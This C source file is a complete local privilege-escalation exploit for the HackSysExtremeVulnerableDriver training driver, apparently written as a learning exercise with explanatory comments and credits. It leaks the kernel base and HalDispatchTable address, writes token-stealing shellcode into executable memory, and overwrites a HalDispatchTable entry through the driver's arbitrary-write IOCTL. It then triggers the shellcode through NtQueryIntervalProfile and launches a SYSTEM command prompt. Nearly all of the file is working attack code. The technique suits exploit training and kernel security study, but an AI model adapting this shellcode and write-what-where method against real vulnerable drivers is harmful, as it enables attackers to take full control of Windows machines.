#include "stdafx.h"
#include "windows.h"
#include "Winternl.h"
#include "stdio.h"
// Thanks to http://www.informit.com/articles/article.aspx?p=22442&seqNum=3 for the following and http://www.rohitab.com/discuss/topic/40696-list-loaded-drivers-with-ntquerysysteminformation/ and zwclose7's first comment
#pragma comment(lib,"ntdll.lib")

NTSTATUS WINAPI NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

/*
	Thanks to http://alter.org.ua/docs/nt_kernel/procaddr/#SYSTEM_MODULE_INFORMATION for the following info.
*/
typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY
{
	ULONG  Unknown1;
	ULONG  Unknown2;
#ifdef _WIN64
	ULONG Unknown3;
	ULONG Unknown4;
#endif
	PVOID  Base;
	ULONG  Size;
	ULONG  Flags;
	USHORT  Index;
	USHORT  NameLength;
	USHORT  LoadCount;
	USHORT  PathLength;
	CHAR  ImagePath[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef NTSTATUS(NTAPI *_NtQueryIntervalProfile)(
	ULONG ProfileSource,
	PULONG Interval
);

// This is a good example to remind myself. When in kernel mode USE THE FLIPPING typedef or your going to get a lot of pain. 
typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG NumberOfModules;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

int main()
{
	printf("Exploiting Write-What-Where vulnerability.\r\n");
	/* FuzzySecurity describes how to get the IOCTL codes an alternative way with a script as follows:
	(0x00000022 << 16) | (0x00000000 << 14) | (FUNC_NUM_HERE << 2) | 0x00000003
	
	Allow me to explain.

	** 0x22 = FILE_DEVICE_UNKNOWN
	   Shifting left by 16 bits will set the device type field according to https://msdn.microsoft.com/en-us/library/ms902086.aspx
	   as this field is from bit 16 to 31

	** 0x00 for access field, aka the next field starting from byte 14, will equal FILE_ANY_ACCESS, as this 
	   field is from bit 14 to bit 15.

	** Bits 2 to 13 are the function number hence the shift here.

	** Last bit is bit 1 which we set to 3 or METHOD_NEITHER 

	** Lastly we OR as this will ensure we set each part of the final 32 bit value (OR 0 or our current value for each segment
	with 1 for the bits we want to set and we will get 1 for each bit we wish to set. Easy solution).
	*/
	 
	HANDLE deviceHandle = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL);
	if (deviceHandle == INVALID_HANDLE_VALUE) {
		printf("Failed to open handle to device driver. :( \r\n");
		return 1;
	}

	printf("Handle value: %i\r\n", deviceHandle);
	printf("Leaking HAL address via NtQuerySystemInformation...\r\n");
	// SystemModuleInformation Call = 11 or 0xB
	// Thanks to https://github.com/GradiusX/HEVD-Python-Solutions/blob/master/Win10%20x64%20v1607/HEVD_arbitraryoverwrite.py
	// and to http://www.vijaymukhi.com/seccourse/june2606/sdthook.htm
	void * bufferPtr = malloc(1);
	int bufferPtrSize = 0;
	ULONG SystemInformationLength;
	NTSTATUS callResult = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, &bufferPtr, bufferPtrSize, &SystemInformationLength);
	printf("%i\r\n", SystemInformationLength);
	free(bufferPtr);

	PSYSTEM_MODULE_INFORMATION moduleInfoBuf = (PSYSTEM_MODULE_INFORMATION) malloc(SystemInformationLength);
	int moduleInfoBufSize = SystemInformationLength;

	// Thanks to https://github.com/Cn33liz/HSEVD-ArbitraryOverwrite/blob/master/HS-ArbitraryOverwrite/HS-ArbitraryOverwrite.c for some help on this code. Advanced C kernel interaction code is complex.
	// Also thanks to http://www.exploit-monday.com/2013/06/undocumented-ntquerysysteminformation.html for the value for SYSTEM_INFORMATION_CLASS
	/* FuzzySecurity explains this all in a jiffy with his code, but unfortunetely I got a bit confused due to the lack of explanation behind it.
	The code was as follows:
		$SystemModuleArray = Get-SystemModuleInformation
		$KernelBase = $SystemModuleArray[0].ImageBase
		$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
		$KernelHanle = [Kernel32]::LoadLibrary("$KernelType")
		$HALUserLand = [Kernel32]::GetProcAddress($KernelHanle, "HalDispatchTable")
		$HalDispatchTable = $HALUserLand.ToInt32() - $KernelHanle + $KernelBase
	*/
	callResult = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, moduleInfoBuf, moduleInfoBufSize, &SystemInformationLength);
	ULONG numModules = moduleInfoBuf->NumberOfModules;
	LPVOID kernelBase = moduleInfoBuf->Module[0].Base;
	PCHAR kernelImage = moduleInfoBuf->Module[0].ImagePath;
	USHORT pathLength = moduleInfoBuf->Module[0].PathLength;

	printf("Kernel base is at %x and the image name is %s\r\n", kernelBase, kernelImage);
	/* So thanks to https://github.com/Cn33liz/HSEVD-ArbitraryOverwrite/blob/master/HS-ArbitraryOverwrite/HS-ArbitraryOverwrite.c for this trick
		basically the value of ImagePath is the full path name so something like \\SystemRoot\\system32\\ntkrnlpa.exe". By adding the value of
		PathLength to the value of ImagePath, we can get just the name of the image itself and not the whole path.
	*/
	LPCSTR lpKernelName = (LPCSTR)(kernelImage + pathLength);
	HMODULE UserModeKernelHandle = LoadLibraryA(lpKernelName);
	LPVOID UserModeHALKernelSymbol = GetProcAddress(UserModeKernelHandle, "HalDispatchTable");
	// Thanks to https://github.com/Cn33liz/HSEVD-ArbitraryOverwrite/blob/master/HS-ArbitraryOverwrite/HS-ArbitraryOverwrite.c for the idea
	// to cast these all to PUCHAR to solve things...
	// This is basically first finding the offset by minusing UserModeKernelHandle address from UserModeHALKernelSymbol to find offset into kernel base where HALDispatchTable is.
	// Then obviously second part just adds this offset to kernel base to find real address.
	LPVOID HALDispatchTable = (PUCHAR)UserModeHALKernelSymbol - (PUCHAR)UserModeKernelHandle + (PUCHAR)kernelBase;
	
	byte theArray[8];
	LPVOID whereAddress = (LPVOID)((ULONG)HALDispatchTable + 0x4);
	
	printf("Allocating shellcode....\r\n");
	char shellcode[60] = (
		"\x60" // PUSHAD
		"\x64\xA1\x24\x01\x00\x00" // MOV EAX, fs:[KTHREAD_OFFSET]
		"\x8B\x40\x50" // MOV EAX, [EAX + EPROCESS_OFFSET]
		"\x89\xC1" // mov ecx, eax (Current EPROCESS structure)
		"\x8B\x98\xF8\x00\x00\x00" // mov ebx, [eax + TOKEN_OFFSET]
								   // #---[Copy System PID token]
		"\xBA\x04\x00\x00\x00" // mov edx, 4 (SYSTEM PID)
		"\x8B\x80\xB8\x00\x00\x00" // mov eax, [eax + FLINK_OFFSET] <-|
		"\x2D\xB8\x00\x00\x00" //               sub eax, FLINK_OFFSET |
		"\x39\x90\xB4\x00\x00\x00" //      cmp[eax + PID_OFFSET], edx |
		"\x75\xED" // jnz                                          -> |
		"\x8B\x90\xF8\x00\x00\x00" // mov edx, [eax + TOKEN_OFFSET]
		"\x89\x91\xF8\x00\x00\x00" // mov[ecx + TOKEN_OFFSET], edx
								   //#---[Recover]
		"\x61" // popad
		"\x31\xC0" // Set NTSTATUS->STATUS_SUCCESS so calling function thinks we exited successfully
		"\xC3" // RET
	);
	printf("Shellcode size: %i\r\n", sizeof(shellcode));
	LPVOID shellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(shellcodeAddress, shellcode, sizeof(shellcode));
	LPVOID sourceAddress = &shellcodeAddress;

	memcpy(theArray, &sourceAddress, 4); // What
	memcpy(theArray + 4, &whereAddress, 4); // Where
	
	printf("Sending the buffer!\r\n");
	printf("Buffer length: %i\r\n", sizeof(theArray));
	printf("IOCTL: 0x22200B\r\n");
	DWORD bytesReturned = 0;
	BOOL result = FALSE;
	result = DeviceIoControl(deviceHandle, 0x22200B, theArray, sizeof(theArray), NULL, 0, &bytesReturned, (LPOVERLAPPED)NULL);
	if (!result) {
		printf("Failed to send data!\r\n");
		CloseHandle(deviceHandle);
		return 1;
	}
	_NtQueryIntervalProfile NtQueryIntervalProfile = (_NtQueryIntervalProfile) GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryIntervalProfile");

	NtQueryIntervalProfile(0xB00D, &bytesReturned);
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));
	STARTUPINFOA si;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

    return 0;
}

